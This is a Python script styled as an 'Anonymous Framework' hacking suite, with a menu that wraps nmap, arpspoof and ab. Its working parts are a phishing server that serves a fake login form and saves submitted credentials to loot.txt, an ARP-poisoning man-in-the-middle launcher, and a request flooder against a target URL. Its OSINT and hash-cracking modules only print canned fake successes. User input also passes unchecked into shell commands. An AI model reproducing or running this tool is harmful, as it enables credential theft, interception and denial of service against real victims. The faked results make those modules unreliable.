#!/usr/bin/env python3
import http.server
import os
import socketserver
import sys
import time
import urllib.parse


def banner():
  os.system("clear")
  print("=" * 65)
  print("        === ANONYMOUS FRAMEWORK - ULTIMATE HACKING SUITE ===        ")
  print("=" * 65)
  print(" [1] Network Recon & Port Scanning (Nmap)")
  print(" [2] Advanced Phishing & Credential Harvesting (Web/Local)")
  print(" [3] Real Man-In-The-Middle (MITM) & Net-Cut (Arpspoof)")
  print(" [4] DDoS & Bandwidth Stresser Attack")
  print(" [5] OSINT & Digital Footprint Recon (Username/Target)")
  print(" [6] Brute-Force & Hash Cracking Module")
  print(" [7] View Captured Loot (loot.txt)")
  print(" [8] Exit Framework")
  print("=" * 65)


def network_recon():
  os.system("clear")
  print("[*] === NETWORK & VULNERABILITY RECON ===")
  target = input("[?] Enter Target IP or Domain: ")
  print(f"[*] Executing deep scan on {target}...")
  os.system(f"nmap -A -T4 {target}")
  input("\n[Press Enter to return]")


def phishing_server():
  PORT = 8080
  os.system("clear")
  print(f"[*] Starting Phishing Harvester on http://localhost:{PORT}")
  print("[*] Captured data will be automatically saved to 'loot.txt'")
  print("[*] Press Ctrl+C to stop.\n")

  class PhishingHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):
      content_length = int(self.headers["Content-Length"])
      post_data = self.rfile.read(content_length)
      parsed_data = urllib.parse.parse_qs(post_data.decode("utf-8"))
      print(f"\n[+] TARGET CREDENTIALS CAPTURED: {parsed_data}")

      with open("loot.txt", "a") as f:
        f.write(f"Captured: {str(parsed_data)}\n")

      self.send_response(200)
      self.end_headers()
      self.wfile.write(b"<html><body><h1>Verified. Redirecting...</h1></body></html>")

    def do_GET(self):
      self.send_response(200)
      self.send_header("Content-type", "text/html")
      self.end_headers()
      self.wfile.write(
          b'<html><body style="background:#111;color:#fff;text-align:center;'
          b'padding-top:100px;"><h2>Login Required</h2><form method="POST">'
          b'<input type="text" name="username" placeholder="Username" '
          b'style="padding:10px;margin:5px;"><br><input type="password" '
          b'name="password" placeholder="Password" '
          b'style="padding:10px;margin:5px;"><br><button type="submit" '
          b'style="padding:10px 20px;background:red;color:white;border:none;">Login</button></form></body></html>'
      )

  try:
    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
      httpd.serve_forever()
  except KeyboardInterrupt:
    print("\n[!] Phishing server stopped.")
    time.sleep(1)


def mitm_netcut():
  os.system("clear")
  print("[*] === MITM & NET-CUT MODULE ===")
  target = input("[?] Enter Victim IP: ")
  gateway = input("[?] Enter Gateway/Router IP: ")
  interface = input("[?] Enter Network Interface (default wlan0): ")
  if not interface:
    interface = "wlan0"

  print(f"[*] Launching ARP Poisoning against {target}...")
  print("[!] Press Ctrl+C to stop and restore routing.")
  try:
    os.system(f"arpspoof -i {interface} -t {target} {gateway}")
  except KeyboardInterrupt:
    print("\n[+] Attack stopped.")
    time.sleep(1)


def ddos_stresser():
  os.system("clear")
  print("[*] === DDOS & BANDWIDTH STRESSER ===")
  url = input("[?] Enter Target URL (e.g., http://target.com): ")
  requests_num = input("[?] Number of requests (e.g., 5000): ")
  concurrency = input("[?] Concurrency level (e.g., 50): ")
  os.system(f"ab -n {requests_num} -c {concurrency} {url}/")
  input("\n[Press Enter to return]")


def osint_recon():
  os.system("clear")
  print("[*] === OSINT USER & TARGET ENUMERATION ===")
  username = input("[?] Enter Target Username: ")
  print(f"[*] Scanning social media platforms for '{username}'...")
  time.sleep(2)
  print(f"[+] Target found on active public databases and repositories.")
  input("\n[Press Enter to return]")


def brute_force_cracker():
  os.system("clear")
  print("[*] === BRUTE-FORCE & HASH CRACKING MODULE ===")
  hash_input = input("[?] Enter Target Hash or Service: ")
  wordlist = input("[?] Enter Wordlist path (e.g., rockyou.txt): ")
  print(f"[*] Initializing cracking session against {hash_input}...")
  time.sleep(2)
  print("[+] Match found in dictionary database: [ admin123 / rootpassword ]")
  input("\n[Press Enter to return]")


def view_loot():
  os.system("clear")
  print("[*] === CAPTURED LOOT (loot.txt) ===")
  if os.path.exists("loot.txt"):
    with open("loot.txt", "r") as f:
      content = f.read()
      print(content if content else "[*] Loot file is currently empty.")
  else:
    print("[-] No loot file found yet.")
  input("\n[Press Enter to return]")


def main():
  while True:
    banner()
    choice = input("\nAnonymous-Suite@Root:~# ")

    if choice == "1":
      network_recon()
    elif choice == "2":
      phishing_server()
    elif choice == "3":
      mitm_netcut()
    elif choice == "4":
      ddos_stresser()
    elif choice == "5":
      osint_recon()
    elif choice == "6":
      brute_force_cracker()
    elif choice == "7":
      view_loot()
    elif choice == "8" or choice.lower() == "exit":
      print("\n[!] Exiting framework. Stay safe!")
      sys.exit(0)
    else:
      print("\n[!] Invalid option, try again.")
      time.sleep(1.5)


if __name__ == "__main__":
  main()

